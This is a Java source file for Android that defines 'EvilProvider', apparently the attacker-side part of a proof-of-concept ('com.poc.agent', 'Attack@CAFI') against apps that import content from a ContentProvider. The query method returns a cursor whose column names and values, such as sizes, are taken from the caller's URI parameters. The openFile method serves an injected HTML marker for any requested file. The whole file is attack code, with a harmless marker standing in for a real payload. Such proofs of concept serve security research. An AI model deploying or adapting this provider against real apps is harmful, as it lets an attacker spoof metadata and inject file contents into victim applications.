package com.poc.agent;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Set;

public class EvilProvider extends ContentProvider {
    public EvilProvider() {
    }
    private static final String TAG = "EvilProvider";

    private static final List<String> NUMERIC_COLUMNS = Arrays.asList(
            "_size", "size", "width", "height", "duration", "count"
    );

    private Object convertValueByColumnName(String columnName, String stringValue) {
        if (NUMERIC_COLUMNS.contains(columnName.toLowerCase())) {
            try {
                return Long.parseLong(stringValue);
            } catch (NumberFormatException e) {
                Log.w(TAG, "Invalid number format for column '" + columnName + "'. Value: '" + stringValue + "'. Returning as String.");
                return stringValue;
            }
        } else {
            return stringValue;
        }
    }

    @Override
    public boolean onCreate() {
        return false;
    }

    @Nullable
    @Override
    public Cursor query(@NonNull Uri uri, @Nullable String[] projection, @Nullable String selection, @Nullable String[] selectionArgs, @Nullable String sortOrder) {

        Log.d(TAG, "Executing query for URI: " + uri.toString());

        Set<String> parameterNames = uri.getQueryParameterNames();

        if (parameterNames == null || parameterNames.isEmpty()) {
            Log.w(TAG, "URI lacks query parameters. Returning empty cursor.");
            return new MatrixCursor(new String[]{});
        }

        List<String> columnNames = new ArrayList<>();
        List<Object> rowValues = new ArrayList<>();

        for (String name : parameterNames) {
            String value = uri.getQueryParameter(name);

            columnNames.add(name);

            Object objectValue = convertValueByColumnName(name, value);

            rowValues.add(objectValue);

            Log.w(TAG, "add "+name+"="+objectValue);
        }

        String[] columns = columnNames.toArray(new String[0]);

        MatrixCursor matrixCursor = new MatrixCursor(columns);

        matrixCursor.addRow(rowValues.toArray());

        Log.d(TAG, "Successfully constructed MatrixCursor with " + columnNames.size() + " columns and 1 row.");

        return matrixCursor;
    }

    @Nullable
    @Override
    public ParcelFileDescriptor openFile(@NonNull Uri uri, @NonNull String mode) throws FileNotFoundException {
        File file;
        Log.d(getContext().getPackageName(), "=====call openFile uri=====: "+uri);
        file = new File(getContext().getCacheDir(), "CAFI");
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(("<b>Attack@CAFI</b>").getBytes());
            fos.flush();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
    }

    @Nullable
    @Override
    public String getType(@NonNull Uri uri) {
        Log.d(TAG,"=====call getType=====");
        return "*/*";
    }

    @Nullable
    @Override
    public Uri insert(@NonNull Uri uri, @Nullable ContentValues values) {
        return null;
    }

    @Override
    public int delete(@NonNull Uri uri, @Nullable String selection, @Nullable String[] selectionArgs) {
        return 0;
    }

    @Override
    public int update(@NonNull Uri uri, @Nullable ContentValues values, @Nullable String selection, @Nullable String[] selectionArgs) {
        return 0;
    }
}